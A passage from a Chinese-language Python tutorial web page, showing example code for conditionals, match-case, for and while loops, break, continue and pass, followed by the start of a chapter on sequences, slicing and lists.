</span></span><span class="line"><span style="color: #abb2bf"># 示例4-7使用or连接多个选择条件   </span></span><span class="line"><span style="color: #abb2bf">score=eval(input(&#39;请输入您的成绩：&#39;))</span></span><span class="line"><span style="color: #abb2bf">if score&lt;0 or score&gt;100:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;成绩无效！&#39;)</span></span><span class="line"><span style="color: #abb2bf">else:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;您的成绩为&#39;,score)</span></span><span class="line"><span style="color: #abb2bf">    </span></span><span class="line"><span style="color: #abb2bf">#示例4-8Python3.11新特性-模式匹配</span></span><span class="line"><span style="color: #abb2bf">score = input(&#39;请输入成绩等级：&#39;)</span></span><span class="line"><span style="color: #abb2bf">match score:</span></span><span class="line"><span style="color: #abb2bf">    case &#39;A&#39;:</span></span><span class="line"><span style="color: #abb2bf">        print(&#39;优秀&#39;)</span></span><span class="line"><span style="color: #abb2bf">    case &#39;B&#39;:</span></span><span class="line"><span style="color: #abb2bf">        print(&#39;良好&#39;)</span></span><span class="line"><span style="color: #abb2bf">    case &#39;C&#39;:</span></span><span class="line"><span style="color: #abb2bf">        print(&#39;中等&#39;)</span></span><span class="line"><span style="color: #abb2bf">    case &#39;D&#39;:</span></span><span class="line"><span style="color: #abb2bf">        print(&#39;及格&#39;)</span></span><span class="line"><span style="color: #abb2bf">    case &#39;E&#39;:</span></span><span class="line"><span style="color: #abb2bf">        print(&#39;不及格&#39;)</span></span></code></pre></div></div></figure><h3 id="3-循环结构"><a href="#3-循环结构" class="headerlink" title="3.循环结构"></a>3.循环结构</h3><p>在Python中循环结构分两类，一类是遍历循环for，一类是无限循环while</p><h4 id="1-遍历循环for的语句结构"><a href="#1-遍历循环for的语句结构" class="headerlink" title="1.遍历循环for的语句结构"></a>1.遍历循环for的语句结构</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170841385.png" alt="image-20251024143448996"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170844875.png" alt="image-20251024143451861"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例4-9遍历for循环的使用</span></span><span class="line"><span style="color: #abb2bf"># 遍历字符串</span></span><span class="line"><span style="color: #abb2bf">for i in &#39;hello&#39;:</span></span><span class="line"><span style="color: #abb2bf">    print(i)</span></span><span class="line"><span style="color: #abb2bf"># range函数，Python中的内置函数，产生一个[n,m)的整数序列，包含n，但是不包含m</span></span><span class="line"><span style="color: #abb2bf">for i in range(1, 11):</span></span><span class="line"><span style="color: #abb2bf">    # print(i)</span></span><span class="line"><span style="color: #abb2bf">    if i % 2 == 0:</span></span><span class="line"><span style="color: #abb2bf">        print(i, &#39;是偶数&#39;)</span></span><span class="line"><span style="color: #abb2bf"># 计算1-10之间的累加和</span></span><span class="line"><span style="color: #abb2bf">s = 0  # 用于存储累加和</span></span><span class="line"><span style="color: #abb2bf">for i in range(1, 11):</span></span><span class="line"><span style="color: #abb2bf">    s += i  # 相当于 s=s+i</span></span><span class="line"><span style="color: #abb2bf">print(&#39;1-10之间的累加和为：&#39;, s)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;-----------100到999之间的水仙花数-------------&#39;)</span></span><span class="line"><span style="color: #abb2bf">&#39;&#39;&#39;</span></span><span class="line"><span style="color: #abb2bf">153=3*3*3+5*5*5+1*1*1</span></span><span class="line"><span style="color: #abb2bf">&#39;&#39;&#39;</span></span><span class="line"><span style="color: #abb2bf">for i in range(100, 1000):</span></span><span class="line"><span style="color: #abb2bf">    sd = i % 10  # 获取个位上的数字   假设   153%10--&gt; 3</span></span><span class="line"><span style="color: #abb2bf">    tens = i // 10 % 10  # 获取十位上的数字   153//10--&gt;15   15%10=5</span></span><span class="line"><span style="color: #abb2bf">    hundred = i // 100  # 获取百位上的数字 153//100--&gt;1</span></span><span class="line"><span style="color: #abb2bf">    # 判断</span></span><span class="line"><span style="color: #abb2bf">    if sd**3+tens**3+hundred**3==i:</span></span><span class="line"><span style="color: #abb2bf">        print(i)</span></span><span class="line"><span style="color: #abb2bf">        </span></span><span class="line"><span style="color: #abb2bf">        </span></span><span class="line"><span style="color: #abb2bf"># 示例4-10遍历循环扩展形式</span></span><span class="line"><span style="color: #abb2bf">s=0 # 用于存储累加和</span></span><span class="line"><span style="color: #abb2bf">for i in range(1,11):</span></span><span class="line"><span style="color: #abb2bf">    s+=i</span></span><span class="line"><span style="color: #abb2bf">else:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;1-10之间的累加和为：&#39;,s)</span></span></code></pre></div></div></figure><h4 id="2-无限循环while的语句结构"><a href="#2-无限循环while的语句结构" class="headerlink" title="2.无限循环while的语句结构"></a>2.无限循环while的语句结构</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170847972.png" alt="image-20251024143515507"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170855789.png" alt="image-20251024143521133"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例4-11无限循环while的使用</span></span><span class="line"><span style="color: #abb2bf"># (1)初始化变量</span></span><span class="line"><span style="color: #abb2bf">answer=input(&#39;今天上课吗？y/n&#39;)</span></span><span class="line"><span style="color: #abb2bf">while answer==&#39;y&#39;: #　（2）条件判断</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;好好学习，天天向上&#39;) # （3）语句块</span></span><span class="line"><span style="color: #abb2bf">    # （4）改变变量</span></span><span class="line"><span style="color: #abb2bf">    answer=input(&#39;今天要上课吗？y/n&#39;)</span></span><span class="line"><span style="color: #abb2bf"># 1-100之间的累加和</span></span><span class="line"><span style="color: #abb2bf">s=0 # 存储累加和</span></span><span class="line"><span style="color: #abb2bf">i=1 # (1)初始化变量</span></span><span class="line"><span style="color: #abb2bf">while i&lt;=100: # （2）条件判断</span></span><span class="line"><span style="color: #abb2bf">        s+=i # (3)语句块</span></span><span class="line"><span style="color: #abb2bf">        # (4) 改变变量</span></span><span class="line"><span style="color: #abb2bf">        i+=1 #　相当于i=i+1</span></span><span class="line"><span style="color: #abb2bf">print(&#39;1-100之间的累加和为：&#39;,s)</span></span><span class="line"><span style="color: #abb2bf"># 示例4-12无限循环while的扩展形式</span></span><span class="line"><span style="color: #abb2bf"># 1-100之间的累加和</span></span><span class="line"><span style="color: #abb2bf">s=0 # 存储累加和</span></span><span class="line"><span style="color: #abb2bf">i=1 # (1)初始化变量</span></span><span class="line"><span style="color: #abb2bf">while i&lt;=100: # （2）条件判断</span></span><span class="line"><span style="color: #abb2bf">        s+=i # (3)语句块</span></span><span class="line"><span style="color: #abb2bf">        # (4) 改变变量</span></span><span class="line"><span style="color: #abb2bf">        i+=1 #　相当于i=i+1</span></span><span class="line"><span style="color: #abb2bf">else:</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;1-100之间的累加和为：&#39;,s)</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf"># 示例4-13使用无限循环模拟用户登录    </span></span><span class="line"><span style="color: #abb2bf">#(1)初始化变量</span></span><span class="line"><span style="color: #abb2bf">i=0</span></span><span class="line"><span style="color: #abb2bf">while i&lt;3: # (2)条件判断</span></span><span class="line"><span style="color: #abb2bf">    # (3)语句块</span></span><span class="line"><span style="color: #abb2bf">    user_name=input(&#39;请输入您的用户名：&#39;)</span></span><span class="line"><span style="color: #abb2bf">    pwd=input(&#39;请输入您的密码：&#39;)</span></span><span class="line"><span style="color: #abb2bf">    # 登录操作，if…else…</span></span><span class="line"><span style="color: #abb2bf">    if user_name==&#39;zjh&#39; and pwd==&#39;888888&#39;:</span></span><span class="line"><span style="color: #abb2bf">        print(&#39;系统正在登录，请稍候~&#39;)</span></span><span class="line"><span style="color: #abb2bf">        # 需要改变循环变量，目的，退出循环</span></span><span class="line"><span style="color: #abb2bf">        i=8 # 第三行 判断 i&lt;3,8&lt;3 False退出while循环</span></span><span class="line"><span style="color: #abb2bf">    else:</span></span><span class="line"><span style="color: #abb2bf">        if i&lt;2:</span></span><span class="line"><span style="color: #abb2bf">            print(&#39;用户名或密码不正确，你还有&#39;,2-i,&#39;次机会&#39;)</span></span><span class="line"><span style="color: #abb2bf">            i+=1 # 相当于i=i+1   #(4)改变变量</span></span><span class="line"><span style="color: #abb2bf"># 单分支的判断</span></span><span class="line"><span style="color: #abb2bf">if i==3: #　当用户名或密码输入三次不正确的时候，循环执行结束了，i的最大值为3</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;对不起，三次均输入错误！&#39;)</span></span></code></pre></div></div></figure><p>循环结构也可以互相嵌套，在一个循环结构中嵌套另一个完整的循环结构就称为嵌套循环</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171001930.png" alt="image-20251024143542939"></p><p>在嵌套循环中通常用于输出一些图形，例如长方形、三角形、菱形等</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171003164.png" alt="image-20251024143549895"></p><h2 id="4-程序跳转语句"><a href="#4-程序跳转语句" class="headerlink" title="4.程序跳转语句"></a>4.程序跳转语句</h2><h3 id="1-break"><a href="#1-break" class="headerlink" title="1.break"></a>1.break</h3><p>程序跳转语句break用于跳（退）出循环结构，通常与if一起搭配使用</p><h4 id="1-无限循环语法结构"><a href="#1-无限循环语法结构" class="headerlink" title="1.无限循环语法结构"></a>1.无限循环语法结构</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171005936.png" alt="image-20251024144256435"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171007515.png" alt="image-20251024144300266"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例4-18跳转语句break在while循环中的使用</span></span><span class="line"><span style="color: #abb2bf">s=0 # 存储累加和</span></span><span class="line"><span style="color: #abb2bf">i=1 # （1）初始化变量</span></span><span class="line"><span style="color: #abb2bf">while i&lt;11: # （2）条件判断</span></span><span class="line"><span style="color: #abb2bf">    #（3）语句块</span></span><span class="line"><span style="color: #abb2bf">    s+=i</span></span><span class="line"><span style="color: #abb2bf">    if s&gt;20:</span></span><span class="line"><span style="color: #abb2bf">        print(&#39;累加和大于20的当前数是：&#39;,i)</span></span><span class="line"><span style="color: #abb2bf">        break</span></span><span class="line"><span style="color: #abb2bf">    i+=1 # （4）改变变量</span></span><span class="line"><span style="color: #abb2bf">print(&#39;--------------------&#39;)</span></span><span class="line"><span style="color: #abb2bf">i=0 # 统计登录的次数 （1）初始化变量</span></span><span class="line"><span style="color: #abb2bf">while i&lt;3: # （2）条件判断</span></span><span class="line"><span style="color: #abb2bf">    # （3）语句块</span></span><span class="line"><span style="color: #abb2bf">    user_name=input(&#39;请输入用户名：&#39;)</span></span><span class="line"><span style="color: #abb2bf">    pwd=input(&#39;请输入密码：&#39;)</span></span><span class="line"><span style="color: #abb2bf">    if user_name==&#39;zjh&#39; and pwd==&#39;888888&#39;:</span></span><span class="line"><span style="color: #abb2bf">       print(&#39;系统正在登录，请稍候……&#39;)</span></span><span class="line"><span style="color: #abb2bf">       break</span></span><span class="line"><span style="color: #abb2bf">    else:</span></span><span class="line"><span style="color: #abb2bf">        if i&lt;2:</span></span><span class="line"><span style="color: #abb2bf">            print(&#39;用户名或密码不正确，你还有&#39;,2-i,&#39;次机会&#39;)</span></span><span class="line"><span style="color: #abb2bf">    # (4)改变变量</span></span><span class="line"><span style="color: #abb2bf">    i+=1</span></span><span class="line"><span style="color: #abb2bf">else: # while…else…</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;三次均输入错误！&#39;)</span></span></code></pre></div></div></figure><h3 id="2-遍历循环语法结构"><a href="#2-遍历循环语法结构" class="headerlink" title="2.遍历循环语法结构"></a>2.遍历循环语法结构</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171011970.png" alt="image-20251024144328503"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171013417.png" alt="image-20251024144331155"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例4-19break在for循环中的使用</span></span><span class="line"><span style="color: #abb2bf">for i in &#39;hello&#39;:</span></span><span class="line"><span style="color: #abb2bf">    if i==&#39;e&#39;:</span></span><span class="line"><span style="color: #abb2bf">        break</span></span><span class="line"><span style="color: #abb2bf">    print(i)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;-----------------------&#39;)</span></span><span class="line"><span style="color: #abb2bf">for i in range(3):</span></span><span class="line"><span style="color: #abb2bf">    # （3）语句块</span></span><span class="line"><span style="color: #abb2bf">    user_name = input(&#39;请输入用户名：&#39;)</span></span><span class="line"><span style="color: #abb2bf">    pwd = input(&#39;请输入密码：&#39;)</span></span><span class="line"><span style="color: #abb2bf">    if user_name == &#39;zjh&#39; and pwd == &#39;888888&#39;:</span></span><span class="line"><span style="color: #abb2bf">        print(&#39;系统正在登录，请稍候……&#39;)</span></span><span class="line"><span style="color: #abb2bf">        break</span></span><span class="line"><span style="color: #abb2bf">    else:</span></span><span class="line"><span style="color: #abb2bf">        if i &lt; 2:</span></span><span class="line"><span style="color: #abb2bf">            print(&#39;用户名或密码不正确，你还有&#39;, 2 - i, &#39;次机会&#39;)</span></span><span class="line"><span style="color: #abb2bf">else: # for…else…</span></span><span class="line"><span style="color: #abb2bf">    print(&#39;三次均输入错误！&#39;)</span></span></code></pre></div></div></figure><h3 id="3-continue"><a href="#3-continue" class="headerlink" title="3.continue"></a>3.continue</h3><p>continue的作用是用于跳过本次循环的后续代码，而继续执行 </p><p>下一次循环操作，continue在循环中通常也是与if一起搭配使用</p><h4 id="1-无限循环语法结构-1"><a href="#1-无限循环语法结构-1" class="headerlink" title="1.无限循环语法结构"></a>1.无限循环语法结构</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171018017.png" alt="image-20251024144447164"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171019219.png" alt="image-20251024144450435"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171021214.png" alt="image-20251024144531346"></p><h4 id="2-遍-历-循-环-语-法-结-构"><a href="#2-遍-历-循-环-语-法-结-构" class="headerlink" title="2 . 遍 历 循 环 语 法 结 构"></a>2 . 遍 历 循 环 语 法 结 构</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171024128.png" alt="image-20251024144545975"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例4-21continue在for循环中的使用</span></span><span class="line"><span style="color: #abb2bf">s=0</span></span><span class="line"><span style="color: #abb2bf">for i in range(1,101):</span></span><span class="line"><span style="color: #abb2bf">    if i%2==1: #奇数</span></span><span class="line"><span style="color: #abb2bf">        i+=1</span></span><span class="line"><span style="color: #abb2bf">        continue # 不再执行后面的代码了</span></span><span class="line"><span style="color: #abb2bf">    # 累加求和的代码</span></span><span class="line"><span style="color: #abb2bf">    s+=i</span></span><span class="line"><span style="color: #abb2bf">print(&#39;1-100之间的偶数和：&#39;,s)</span></span></code></pre></div></div></figure><h2 id="5-空语句pass"><a href="#5-空语句pass" class="headerlink" title="5.空语句pass"></a>5.空语句pass</h2><p>pass是Python中的保留字 </p><p>在语法结构中只起到占位符的作用，使语法结构完整，不报错 </p><p>一般可用在if、for、while、函数的定义、类的定义中</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例4-22空语句pass</span></span><span class="line"><span style="color: #abb2bf">if True:</span></span><span class="line"><span style="color: #abb2bf">    pass</span></span><span class="line"><span style="color: #abb2bf">while True:</span></span><span class="line"><span style="color: #abb2bf">    pass</span></span><span class="line"><span style="color: #abb2bf">for i in range(10):</span></span><span class="line"><span style="color: #abb2bf">    pass</span></span></code></pre></div></div></figure><h2 id="6-本章总结"><a href="#6-本章总结" class="headerlink" title="6.本章总结"></a>6.本章总结</h2><ul><li>程序的描述方式有三种：自然语言、流程图和伪代码 (代码） </li><li>程序的组织结构有三种：顺序结构、选择结构（分支结构）、循环结构 </li><li>选择结构分单分支结构(if)、双分支结构(if….else…)和多分支结构(if…elif…else…） </li><li>Python3.11新特征模式匹配match…case…结构 </li><li>循环结构有两种：遍历循环for和无限循环while </li><li>if结构可以互相嵌套，循环结构也可以互相嵌套，建议最多不超过三层 </li><li>break和continue只能用在循环结构中，break用于退出整个循环结构，continue用于结束本次循环 而进入下一次循环。 </li><li>空语句pass起到占位符的作用，使用语法结构完整、不报错</li></ul><h1 id="第五章-数据组合类型"><a href="#第五章-数据组合类型" class="headerlink" title="第五章 数据组合类型"></a>第五章 数据组合类型</h1><h2 id="1-本章目标-2"><a href="#1-本章目标-2" class="headerlink" title="1.本章目标"></a>1.本章目标</h2><ul><li>了解序列和索引的相关概念 </li><li>掌握序列的相关操作 </li><li>掌握列表的相关操作 </li><li>掌握元组的相关操作 </li><li>掌握字典的相关操作 </li><li>掌握集合的相关操作</li></ul><h2 id="2-序列和索引"><a href="#2-序列和索引" class="headerlink" title="2.序列和索引"></a>2.序列和索引</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h3><p>序列是一个用于存储多个值的连续空间，每个值都对应一个整数的编号，称为索引、</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171031209.png" alt="image-20251024160219446"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-1使用索引检索字符串中的元素</span></span><span class="line"><span style="color: #abb2bf"># 正向递增索引</span></span><span class="line"><span style="color: #abb2bf">s=&#39;helloworld&#39;</span></span><span class="line"><span style="color: #abb2bf">for i in range(0,len(s)):</span></span><span class="line"><span style="color: #abb2bf">    print(i,s[i],end=&#39;\t\t&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;\n--------------------------------------&#39;)</span></span><span class="line"><span style="color: #abb2bf"># 反向递减</span></span><span class="line"><span style="color: #abb2bf">for i in range(-10,0):</span></span><span class="line"><span style="color: #abb2bf">    print(i,s[i],end=&#39;\t\t&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;\n&#39;,s[9],s[-1])</span></span></code></pre></div></div></figure><h3 id="2-切片的语法操作"><a href="#2-切片的语法操作" class="headerlink" title="2.切片的语法操作"></a>2.切片的语法操作</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171033023.png" alt="image-20251024160239009"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-2序列的切片操作</span></span><span class="line"><span style="color: #abb2bf">s=&#39;HelloWorld&#39;</span></span><span class="line"><span style="color: #abb2bf"># 切片操作</span></span><span class="line"><span style="color: #abb2bf">s1=s[0:5:2] # 索引从0开始，到5结束（不包含5），步长为2</span></span><span class="line"><span style="color: #abb2bf">print(s1)</span></span><span class="line"><span style="color: #abb2bf"># 省略了开始位置，start默认从0开始</span></span><span class="line"><span style="color: #abb2bf">print(s[:5:1])</span></span><span class="line"><span style="color: #abb2bf"># 省略开始位置start，省略步长step，步长默认为1</span></span><span class="line"><span style="color: #abb2bf">print(s[:5:])</span></span><span class="line"><span style="color: #abb2bf"># 省略结束位置</span></span><span class="line"><span style="color: #abb2bf">print(s[0::1]) # stop,默认到序列的最后一个元素（包含最后一个元素）</span></span><span class="line"><span style="color: #abb2bf">print(s[5::])</span></span><span class="line"><span style="color: #abb2bf">print(s[5:]) # 12行代码与13行代码功能相同，省略了结束，省略了一个步长</span></span><span class="line"><span style="color: #abb2bf"># 更改一下步长，步长更改为2</span></span><span class="line"><span style="color: #abb2bf">print(s[0:5:2])</span></span><span class="line"><span style="color: #abb2bf"># 省略开始位置，省略结束位置，只写步长</span></span><span class="line"><span style="color: #abb2bf">print(s[::2]) # 分别获取0,2,4,6,8索引位置上的元素</span></span><span class="line"><span style="color: #abb2bf"># 步长为负数</span></span><span class="line"><span style="color: #abb2bf">print(s[::-1]) # 可以使用哪句代码替换嗯</span></span><span class="line"><span style="color: #abb2bf">print(s[-1:-11:-1])</span></span></code></pre></div></div></figure><h3 id="3-序列的相加操作"><a href="#3-序列的相加操作" class="headerlink" title="3.序列的相加操作"></a>3.序列的相加操作</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171035017.png" alt="image-20251024160255292"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171037471.png" alt="image-20251024160313528"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171039165.png" alt="image-20251024160321478"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-3序列的相加相乘操作</span></span><span class="line"><span style="color: #abb2bf">s=&#39;Hello&#39;</span></span><span class="line"><span style="color: #abb2bf">s2=&#39;World&#39;</span></span><span class="line"><span style="color: #abb2bf">print(s+s2) #产生一个新的字符串序列</span></span><span class="line"><span style="color: #abb2bf"># 序列的相乘操作</span></span><span class="line"><span style="color: #abb2bf">print(s*5)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;_&#39;*40)</span></span><span class="line"><span style="color: #abb2bf"># 示例5-4序列的相关操作符和函数的使用</span></span><span class="line"><span style="color: #abb2bf">s=&#39;helloworld&#39;</span></span><span class="line"><span style="color: #abb2bf">print(&#39;e在helloworld中存在吗？&#39;,(&#39;e&#39; in s)) # in的使用</span></span><span class="line"><span style="color: #abb2bf">print(&#39;v在helloworld中存在吗？&#39;,(&#39;v&#39; in s))</span></span><span class="line"><span style="color: #abb2bf"># not in 的使用</span></span><span class="line"><span style="color: #abb2bf">print(&#39;e在helloworld中不存在吗？&#39;,(&#39;e&#39; not in s)) # not in 的使用</span></span><span class="line"><span style="color: #abb2bf">print(&#39;v在helloworld中不存在吗？&#39;,(&#39;v&#39; not in s))</span></span><span class="line"><span style="color: #abb2bf"># 内置函数的使用</span></span><span class="line"><span style="color: #abb2bf">print(&#39;len():&#39;,len(s))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;max():&#39;,max(s))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;min():&#39;,min(s))</span></span><span class="line"><span style="color: #abb2bf"># 序列对象的方法，使用序列的名称，打点调用</span></span><span class="line"><span style="color: #abb2bf">print(&#39;s.index():&#39;,s.index(&#39;o&#39;)) # o在s中第一次出现的索引位置 4</span></span><span class="line"><span style="color: #abb2bf"># print(&#39;s.index():&#39;,s.index(&#39;v&#39;)) # ValueError: substring not found,报错的原</span></span><span class="line"><span style="color: #abb2bf">因是v在字符串中根本不存在，不存在所以找不到</span></span><span class="line"><span style="color: #abb2bf">print(&#39;s.count():&#39;,s.count(&#39;o&#39;)) # 统计o在字符串s中出现的次数</span></span></code></pre></div></div></figure><h2 id="3-列表类型"><a href="#3-列表类型" class="headerlink" title="3.列表类型"></a>3.列表类型</h2><h3 id="1-列表定义"><a href="#1-列表定义" class="headerlink" title="1.列表定义"></a>1.列表定义</h3><p>是指一系列的按特定顺序排列的元素组成。</p><p>是Python中内置的可变序列 </p><p>在Python中使用[]定义列表，元素与元素之间使用英文的逗号分隔 </p><p>列表中的元素可以是任意的数据类型</p><h3 id="2-列表的创建方式有两种"><a href="#2-列表的创建方式有两种" class="headerlink" title="2.列表的创建方式有两种"></a>2.列表的创建方式有两种</h3><h4 id="1-使用-直接创建列表"><a href="#1-使用-直接创建列表" class="headerlink" title="(1)使用[]直接创建列表"></a>(1)使用[]直接创建列表</h4><p>语法结构如下： </p><p>列表名&#x3D;[element1,element2,……elementN]</p><h4 id="2-使用内置函数list-创建列表"><a href="#2-使用内置函数list-创建列表" class="headerlink" title="(2)使用内置函数list()创建列表"></a>(2)使用内置函数list()创建列表</h4><p>语法结构如下： </p><p>列表名&#x3D;list(序列)</p><h3 id="3-列表的删除"><a href="#3-列表的删除" class="headerlink" title="3.列表的删除"></a>3.列表的删除</h3><p>语法结构如下： </p><p>del 列表名</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-5列表的创建与删除</span></span><span class="line"><span 